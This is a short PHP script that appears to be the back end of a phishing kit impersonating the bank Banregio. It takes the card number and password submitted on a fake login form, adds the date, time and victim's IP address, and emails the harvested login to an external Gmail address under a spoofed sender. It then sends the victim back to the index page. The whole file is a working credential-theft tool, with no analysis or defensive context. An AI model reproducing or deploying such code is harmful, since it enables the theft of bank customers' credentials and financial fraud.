<?
$Fecha= date('d-m-Y');
$Hora= date('H:i:s');
$Tarjeta = $_POST['user'];
$ContraseГ±a = $_POST['pass'];

$ip = getenv("REMOTE_ADDR");

$content .= "Fecha: $Fecha / Hora: $Hora

Acceso: $Tarjeta
IP: $ip";

$recipient = "yosoytuinfierno3@gmail.com";
$subject = "Banregio Acceso - $ip";
$from = "From:Login<noreply@sportsjobs.com.mx>";

if(mail($recipient,$subject,$content,$from)){
?>

<?
}else{
header("Location: index.html");
}
echo "<meta http-equiv='Refresh' content='0;url= index.html'>";
?>